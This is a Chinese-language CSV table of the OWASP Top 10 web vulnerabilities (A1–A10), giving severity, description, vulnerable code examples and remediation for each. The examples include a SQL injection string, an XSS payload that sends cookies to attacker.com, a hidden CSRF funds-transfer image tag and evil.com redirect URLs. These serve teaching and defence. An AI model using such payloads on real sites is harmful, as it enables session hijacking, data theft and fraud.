漏洞ID,漏洞名称,漏洞等级,漏洞描述,代码示例,修复方案
A1,注入攻击,高危,注入攻击漏洞，例如SQL，OS以及LDAP注入。这些攻击发生在当不可信的数据作为命令或者查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者访问未被授权的数据。,"应用程序在下面存在漏洞的SQL语句的构造中使用不可信
数据：
String query = ""SELECT * FROM accounts WHERE
custID='"" + request.getParameter(""id"") +""'"";
攻击者在浏览器中将“id”参数的值修改成 ’ or’1’=’1. 这样查
询语句的意义就变成了从帐户数据库中返回所有的记
录，而不是只有目标客户的信息。
http://example.com/app/accountView?id=' or '1'='1
在最严重的情况下，攻击者能够使用这一漏洞调用数据
库中特殊的储存过程，从而达到完全接管数据库，甚至
运行数据库的主机。","防止注入漏洞需要将不可信数据从命令及查询中区分
开。
1. 最佳选择是使用安全的，完全避免使用解释器或提供参
数化界面的API。但要注意有些参数化的API，比如存储过
程(stored procedures)，如果使用不当，任然可以引入注
入漏洞。
2. 如果没法使用一个参数化的API，那么你应该使用解释
器的具体的escape语法来避免特殊字符。OWASP的ESAPI
就有一些escape例程。
3.使用正面的或“白名单”的，具有恰当的规范化的输入验
证方法同样会有助于防止注入攻击。但由于很多应用在
输入中需要特殊字符，这一方法不是完整的防护方法。
OWASP的ESAPI中包含一个白名单输入验证例程的扩展
库。"
A2,跨站脚本（XSS）,高危,当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送给一个网页浏览器，这就会产生跨站脚本攻击（简称XSS）。XSS允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站、或者将用户转向至恶意网站。,"应用程序在下面HTML代码段的构造中使用未经验证或转
义的不可信的数据：
(String) page += ""<input name='creditcard' type='TEXT‘
value='"" + request.getParameter(""CC"") + ""'>"";
攻击者在浏览器中修改‘CC’ 参数为如下值：
'><script>document.location=
'http://www.attacker.com/cgi‐bin/cookie.cgi?
foo='+document.cookie</script>'.
这导致受害者的会话ID被发送到攻击者的网站，使得攻击
者能够劫持用户当前会话。请注意攻击者同样能使用跨
站脚本攻破应用程序可能使用的任何跨站请求伪造
（CSRF）防御机制。","防止跨站脚本需要将不可信数据与动态的浏览器内容区
分开。
1.最好的办法是根据数据将要置于的HTML上下文（包括
主体、属性、JavaScript、CSS, 或URL）转义 (escape) 所有
的不可信数据。除非用户界面 (UI) 框架已经提供转义，开
发者需要在应用程序中提供转义 (escaping)。更多关于数
据转义的信息见OWASP XSS Prevention Cheat Sheet。
2.使用正面的或“白名单”的， 具有恰当的规范化和解码功
能的输入验证方法同样会有助于防止跨站脚本。但由于
很多应用程序在输入中需要特殊字符，这一方法不是完
整的防护方法。这种验证方法需要尽可能地解码任何编
码输入，同时在接受输入之前需要充分验证数据的长
度、字符、格式、和任何商务规则。"
A3,失效的身份认证和会话管理,高危,与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、密匙、会话令牌或攻击其他的漏洞去冒充其他用户的身份。,"案例1：机票预订应用程序支持URL重写，把会话ID放在
URL里：
http://example.com/sale/saleitems;jsessionid=
2P0OC2JDPXM0OQSNDLPSKHCJUN2JV?dest=Hawaii
该网站一个经过认证的用户希望让他朋友知道这个机票
打折信息。他将上面链接通过邮件发给他朋友们，并不
知道自己已经泄漏了自己的会话ID。 当他的朋友们使用
上面的链接时，他们将会使用他的会话和信用卡。
案例2：应用程序超时设置不当。 用户使用公共计算机访
问网站。离开时，该用户没有点击退出，而是直接关闭
浏览器。攻击者在一个小时后能使用相同浏览器通过身
份认证。
案例3：内部或外部攻击者进入系统的密码数据库. 存储在
数据库中的用户密码没有被加密, 所有用户的密码都被攻
击者获得。","对企业最主要的建议是让开发人员可以使用如下资源：
1.一套单一的强大的认证和会话管理控制系统。这套控制
系统应:
a) 满足OWASP的应用程序安全验证标准(ASVS)
中V2(认证)和V3(会话管理)中制定的所有认证
和会话管理的要求。
b) 具有简单的开发界面。ESAPI认证器和用户
API是可以仿照、使用或扩展的好范例。
2.企业同样也要做出巨大努力来避免跨站漏洞，因为这一
漏洞可以用来盗窃用户会话ID。"
A4,不安全的直接对象引用,中危,当开发人员暴露一个对内部实现对象的引用时，例如，一个文件、目录或者数据库密匙，就会产生一个不安全的直接对象引用。在没有访问控制检测或其他保护时，攻击者会操控这些引用去访问未授权数据。,"应用程序在访问帐户信息的SQL调用中使用未验证数据：
String query = ""SELECT * FROM accts WHERE account = ?"";
PreparedStatement pstmt =
connection.prepareStatement(query , … );
pstmt.setString( 1, request.getparameter(""acct""));
ResultSet results = pstmt.executeQuery( );
攻击者能轻易在浏览器将 “acct” 参数修改成他所想要的任
何账户号码。如果应用程序没有进行恰当的验证，攻击
者就能访问任何用户的账户，而不仅仅是该目标用户的
账户。
http://example.com/app/accountInfo?acct=notmyacct","要防止不安全的直接对象引用需要选择一个适当的方法
来保护每一个用户可访问的对象（如对象号码、文件
名）：
1.使用基于用户或者会话的间接对象引用。这样能防止攻
击者直接攻击未授权资源。例如，一个下拉列表包含6个
授权给当前用户的资源，它可以使用数字1‐6来指示哪个
是用户选择的值，而不是使用资源的数据库关键字来表
示。在服务器端，应用程序需要将每个用户的间接引用
映射到实际的数据库关键字。OWASP的ESAPI包含了两种
序列和随机访问引用映射，开发人员可以用来消除直接
对象引用。
2.检查访问。任何来自不可信源的直接对象引用都必须通
过访问控制检测，确保该用户对请求的对象有访问权
限。"
A5,跨站请求伪造（CSRF）,高危,一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送到一个存在漏洞的web应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，而这些请求会被应用程序认为是用户的合法请求。,"应用程序允许用户提交不包含任何保密字段的状态改变
请求，如：
http://example.com/app/transferFunds?amount=1500
&destinationAccount=4673243243
因此，攻击者构建一个请求，用于将受害用户账户中的
现金转移到自己账户。然后攻击者在其控制的多个网站
的图片请求或iframe中嵌入这种攻击。
<img src=""http://example.com/app/transferFunds?
amount=1500&destinationAccount=attackersAcct#“
width=""0"" height=""0"" />
如果受害用户通过example.com认证后访问任何一个这样
的恶意网站，伪造的请求将包含用户的会话信息，导致
该请求被授权执行。","要防止跨站请求伪造，需要在每个HTTP请求的主体(body)
或者URL中添加一个不可预测的令牌。这种令牌至少应该
对每个用户会话来说是唯一的，或者也可以对每个请求
是唯一的。
1.最好的方法是将独有的令牌包含在一个隐藏字段中。这
将使得该令牌通过HTTP请求主体发送，避免其被包含在
URL中从而被暴露出来。
2.该独有令牌同样可以包含在URL中或作为一个URL参数。
但是这种安排的风险是：URL会暴露给攻击者，这样秘密
令牌的也会被泄漏。
OWASP’s CSRF Guard 可以用来在Java EE, .NET, or PHP应用
程序中自动加入这种令牌。 OWASP的ESAPI包含令牌生成
器和验证器。开发者可以用他们来保护网站交易。"
A6,安全配置错误,中危,好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台，定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、实施和维护所有这些设置。这包含了对所有的软件保持及时地更新，包括所有应用程序的库文件。,"案例 #1: 你的应用程序依赖于强大的框架，比如Struts或
者Spring。在这些你所依赖的框架部分中，发现了XSS漏
洞。一个发布的安全更新可以修复这些漏洞，但是你没
有更新你的库文件。在你更新这些库文件以前，攻击者
可以很容易的找到并攻破这些应用程序的漏洞。
案例 #2: 应用程序服务器管理员控制台自动安装后没有被
删除。而默认帐户也没有被改变。攻击者在你的服务器
上发现了标准的管理员页面，通过默认密码登录，从而
接管了你的服务器。
案例 #3: 目录列表在你的服务器上未被禁用。攻击者发现
只需列出目录，她就可以找到你服务器上的任意文件。
攻击者找到并下载所有已编译的Java类，他通过反编译获
得了所有你的自定义代码。然后，他在你的应用程序中
找到一个访问控制的严重漏洞。
案例 #4: 应用程序服务器配置允许堆栈跟踪返回给用户，
这样就暴露了潜在的漏洞。攻击者热衷于收集错误消息
里提供的额外信息。","主要的建议建立在以下几个方面:
1. 一个可以快速且易于部署在另一个锁定环境的可重复的
加固过程。开发、质量保证和生产环境都应该配置相
同。这个过程应该是自动化的，以尽量减少安装一个新
安全环境的耗费。
2. 一个能及时了解并部署每个已部署环境的所有最新软件
更新和补丁的过程。这需要包括通常被忽略的所有代码
的库文件。
3. 一个能在组件之间提供良好的分离和安全性的强大应用
程序架构。
4. 实施漏洞扫描和经常进行审计以帮助检测将来可能的错
误配置或没有安装的补丁。"
A7,不安全的加密存储,高危,许多web应用程序并没有使用恰当的加密措施或Hash算法保护敏感数据，比如信用卡、社会安全号码（SSN）、身份认证证书等等。攻击者可能利用这种弱保护数据实行身份盗窃、信用卡诈骗或其他犯罪。,"案例 #1: 一个应用程序加密存储在数据库的信用卡信息，
以防止信用卡信息暴露给最终用户。但是，数据库设置
为对信用卡表列的查询进行自动解密，这就使得SQL注入
漏洞能够获得所有信用卡信息的明文。该系统应该被设
置为只允许后端应用程序解密信用卡信息，而不是前端
网络应用程序。
案例 #2: 一个备份磁盘里包含加密的医疗记录，但是用于
加密的密钥存储在同一个备份里。而磁带在到达备份中
心的途中遗失。
案例 #3: 密码数据库使用不带salt的哈希算法去存储每个
人的密码。一个文件上传漏洞使黑客能够获取密码文
件。所有这些没有使用salt来哈希的密码通过暴力破解方
式能够在四周内被破解，而使用了恰当的salt来哈希的密
码则需要3000年才能被破解。","不安全加密的风险远远超出了TOP 10的范围。尽管如此，
对一些需要加密的敏感数据，应该起码做到以下几点：
1.预测一些威胁（比如内部攻击和外部用户），加密这些
数据的存储以确保免受这些威胁。
2.确保异地备份的数据被加密，但用于加密的密钥要和数
据分开管理和备份。
3.确保使用了合适的强大的标准算法和强大的密匙，并且
密匙管理到位。
4.确保使用强大的标准哈希算法和合理的 salt 来保护密
码。
5.确保所有密匙和密码都是被保护的, 不被未经授权的访
问。"
A8,没有限制URL访问,中危,许多web应用程序在显示受保护的链接和按钮之前会检测URL访问权限。但是，当这些页面被访问时，应用程序也需要执行类似的访问控制检测，否则攻击者将可以伪造这些URL去访问隐藏的网页。,"攻击者只需简单地迫使浏览器连接到目标网址。例如下
面的两个网址都需要身份验证。访问“admin_getappInfo”
页面同时还需要管理员权限。
http://example.com/app/getappInfo
http://example.com/app/admin_getappInfo
如果攻击者没有通过身份认证，却能访问上述任一页
面，那么表示未授权的访问被允许。如果通过验证的非
管理员用户也能允许访问“admin_getappInfo”页面，那么
这是个漏洞。这个漏洞可能会将攻击者引向更多保护不
当的管理页面。
当应用程序只是简单的对未授权用户不显示链接和按
钮，却没有合理保护他们请求的页面时，通常就会造成
造成这种漏洞。","阻止未经授权的URL访问，需要选择一个方式来保证
每个页面都需要适当的身份验证和适当的授权。通常，
这种保护机制是由应用程序代码之外的一个或多个外部
组件提供的。无论何种机制，都建议：
1.认证和授权政策应该基于角色，使维持这些策略的耗费
最小化。
2.政策应该是高度可配置的，以尽量减少硬编码的政策问
题。
3.执行机制在缺省情况下，应该拒绝所有访问。对于每个
页面的访问，需要明确授予特定的用户和角色访问权
限。
4.如果页面参与了工作流程，检查并确保当前的条件是授
权访问此页面的合适状态。"
A9,传输层保护不足,高危,应用程序时常没有进行身份认证，加密措施，甚至没有保护敏感网络数据的保密性和完整性。而当进行保护时，应用程序有时采用弱算法、使用过期或无效的证书，或不正确地使用这些技术。,"案例 #1: 一个网站上所有需要身份验证的网页都没有使用
SSL。攻击者只需监控网络数据流（比如一个开放的无线
网络或其社区的有线网络），并观察一个已验证的受害
者的会话cookie。然后，攻击者利用这个cookie执行重放
攻击并接管用户的会话。
案例 #2: 网站有不正确配置的SSL证书从而导致其用户使
用浏览器时产生警告。用户必须接受这样的警告以便继
续使用该网站。这将导致用户对这种警告习以为常。针
对网站客户的钓鱼攻击会引诱用户到一个没有有效证书
的类似的网站，这样就会产生相似的警告。由于受害者
已习惯了这样的警告，他们继续登陆和使用这个钓鱼网
站，将密码或其他私人数据泄露出去。
案例 #3: 一个网站简单地使用标准的ODBC/JDBC进行数据
库连接，而没有意识到所有的数据流都是明文。","提供恰当的传输层保护会影响网站的设计。最简单的方
法是要求SSL用于整个网站。由于性能原因，一些网站仅
在私有页面中使用SSL。而其他一些网站仅在“关键”的网
页中使用SSL，但这样就可能暴露会话ID和其他敏感数
据。因此，至少要做到如下几点：
1.要求所有敏感网页都使用SSL。对这些网页的非SSL请求
应被重定向到相应的SSL网页。
2.对所有敏感的Cookie都设置“安全”(“secure”) 标志。
3.配置你的SSL的供应端只支持强大的（比如符合FIPS 140‐
2标准）算法。
4.确保你的证书是有效的，没有过期，没有被废除，并匹
配网站使用的所有域。
5.后端和其他连接也应该使用SSL或其他加密技术。"
A10,未验证的重定向和转发,中危,Web应用程序经常将用户重定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面。如果没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站，或者使用转发去访问未授权的页面。,"案例 #1: 应用程序有一个名为“redirect.jsp”的页面，该页
面有一个参数名是“url”。攻击者精心制作一个恶意URL将
用户重定向到一个恶意网站，执行钓鱼攻击并安装恶意
程序。
http://www.example.com/redirect.jsp?url=evil.com
案例 #2: 应用程序使用转发在网站的不同部分之间发送请
求。为了帮助实现这一功能，如果一个交易成功了的
话，一些网页就会发送一个参数给用户，用于指定用户
的下一个页面。在这种情况下,攻击者制作一个URL, 用于
绕过应用程序的访问控制检查,并将他转发给一个他通常
不能访问的管理功能能。
http://www.example.com/boring.jsp?fwd=admin.jsp","重定向和转发的安全使用可以有多种方式完成：
1.避免使用重定向和转发。
2.如果使用了重定向和转发，则不要在计算目标时涉及到
用户参数。这通常容易做到。
3.如果使用目标参数无法避免,应确保其所提供的值对于
当前用户是有效的,并已经授权。
建议把这种目标的参数做成一个映射
值，而不是真的URL或其中的一部分，然后由服务器端代
码将映射值转换成目标URL。
应用程序可以使用ESAPI重写
sendRedirect()方法来确保所有重定向的目的地是安全的。
避免这种漏洞是非常重要的，因为钓鱼软件为了获取用
户信任，往往最喜欢攻击这种漏洞。"
